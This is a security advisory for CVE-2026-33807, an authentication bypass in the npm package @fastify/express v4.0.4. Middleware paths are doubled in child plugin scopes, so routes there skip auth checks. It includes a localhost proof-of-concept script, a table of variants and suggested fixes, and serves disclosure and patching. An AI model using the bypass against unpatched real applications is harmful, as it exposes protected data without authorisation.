# [C] @fastify/express's middleware path doubling causes authentication bypass in child plugin scopes

## Summary
Severity: Critical
Advisory: GHSA-hrwm-hgmj-7p9c
CVE: CVE-2026-33807
CWE: CWE-436
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N (CVSS_V3)
Published: 2026-04-16
Source: https://github.com/advisories/GHSA-hrwm-hgmj-7p9c
Type: github-advisory

## Affected
- npm: `@fastify/express` — affected >=0 <4.0.5

## Details
### Summary

`@fastify/express` v4.0.4 contains a path handling bug in the `onRegister` function that causes middleware paths to be doubled when inherited by child plugins. This results in complete bypass of Express middleware security controls for all routes defined within child plugin scopes that share a prefix with parent-scoped middleware. No special configuration is required — this affects the default Fastify configuration.

### Details

The vulnerability exists in the `onRegister` function at `index.js` lines 92-101. When a child plugin is registered with a prefix, the `onRegister` hook copies middleware from the parent scope and re-registers it using `instance.use(...middleware)`. However, the middleware paths stored in `kMiddlewares` are already prefixed from their original registration.

The call flow demonstrates the problem:
1. Parent scope registers middleware: `app.use('/admin', authFn)` — `use()` calculates path as `'' + '/admin' = '/admin'` — stores `['/admin', authFn]` in `kMiddlewares`
2. Child plugin registers with `{ prefix: '/admin' }` — triggers `onRegister(instance)`
3. `onRegister` copies parent middleware and calls `instance.use('/admin', authFn)` on child
4. Child's `use()` function calculates path as `'/admin' + '/admin' = '/admin/admin'` — registers middleware with doubled path
5. Routes in child scope use the child's Express instance, where middleware is registered under the incorrect path `/admin/admin`
6. Requests to `/admin/secret` don't match `/admin/admin` — middleware is silently skipped

The root cause is in the `use()` function at lines 25-26, which always prepends `this.prefix` to string paths, combined with `onRegister` re-calling `use()` with already-prefixed paths.

### PoC

```javascript
const fastify = require('fastify');
const http = require('http');

function get(port, url) {
  return new Promise((resolve, reject) => {
    http.get('http://localhost:' + port + url, (res) => {
      let data = '';
      res.on('data', (chunk) => data += chunk);
      res.on('end', () => resolve({ status: res.statusCode, body: data }));
    }).on('error', reject);
  });
}

async function test() {
  const app = fastify({ logger: false });
  await app.register(require('@fastify/express'));
  
  // Middleware enforcing auth on /admin routes
  app.use('/admin', function(req, res, next) {
    if (!req.headers.authorization) {
      res.statusCode = 403;
      res.setHeader('content-type', 'application/json');
      res.end(JSON.stringify({ error: 'Forbidden' }));
      return;
    }
    next();
  });
  
  // Root scope route — middleware works correctly
  app.get('/admin/root-data', async () => ({ data: 'root-secret' }));
  
  // Child scope route — middleware BYPASSED
  await app.register(async function(child) {
    child.get('/secret', async () => ({ data: 'child-secret' }));
  }, { prefix: '/admin' });
  
  await app.listen({ port: 19876, host: '0.0.0.0' });
  
  // Root scope: correctly blocked
  let r = await get(19876, '/admin/root-data');
  console.log('/admin/root-data (no auth):', r.status, r.body);
  // Output: 403 {"error":"Forbidden"}
  
  // Child scope: BYPASSED — secret data returned without auth
  r = await get(19876, '/admin/secret');
  console.log('/admin/secret (no auth):', r.status, r.body);
  // Output: 200 {"data":"child-secret"}
  
  await app.close();
}
test();
```

Actual output:
```
/admin/root-data (no auth): 403 {"error":"Forbidden"}
/admin/secret (no auth): 200 {"data":"child-secret"}
```

### Impact

Complete bypass of Express middleware security controls for all routes defined in child plugin scopes. Authentication, authorization, rate limiting, CSRF protection, audit logging, and any other middleware-based security mechanisms are silently skipped for affected routes.

- No special request crafting is required — normal requests bypass the middleware
- It affects the idiomatic Fastify plugin pattern commonly used in production
- The bypass is silent with no errors or warnings
- Developers' basic testing of root-scoped routes will pass, masking the vulnerability
- Any child plugin scope that shares a prefix with middleware is affected

Applications using `@fastify/express` with path-scoped middleware and child plugins with matching prefixes are vulnerable in default configurations.

### Affected Versions

- `@fastify/express` v4.0.4 (latest at time of discovery)
- Fastify 5.x in default configuration
- No special router options required (`ignoreDuplicateSlashes` not needed)
- Affects any child plugin registration where the prefix overlaps with middleware path scoping
- Does NOT affect middleware registered without path scoping (global middleware)
- Does NOT affect middleware registered on root path (`/`) due to special case handling

### Variant Testing

| Scenario | Middleware Path | Child Prefix | Result |
|---|---|---|---|
| Root route `/admin/root-data` | `/admin` | N/A | Middleware runs (403) |
| Child route `/admin/secret` | `/admin` | `/admin` | **BYPASS** (200) |
| Child route `/api/data` | `/api` | `/api` | **BYPASS** (200) |
| Nested child `/admin/sub/data` | `/admin` | `/admin/sub` | **BYPASS** — path becomes `/admin/sub/admin` |
| Middleware on `/` with any child | `/` | `/api` | No bypass — `path === '/' && prefix.length > 0` special case |

### Suggested Fix

The `onRegister` function should store and re-use the original unprefixed middleware paths, or avoid re-calling the `use()` function entirely. Options include:
1. Store the original path and function separately in `kMiddlewares` before prefixing
2. Strip the parent prefix before re-registering in child scopes
3. Store already-constructed Express middleware objects rather than re-processing paths

## References
- https://github.com/fastify/fastify-express/security/advisories/GHSA-hrwm-hgmj-7p9c
- https://nvd.nist.gov/vuln/detail/CVE-2026-33807
- https://cna.openjsf.org/security-advisories.html
- https://github.com/fastify/fastify-express
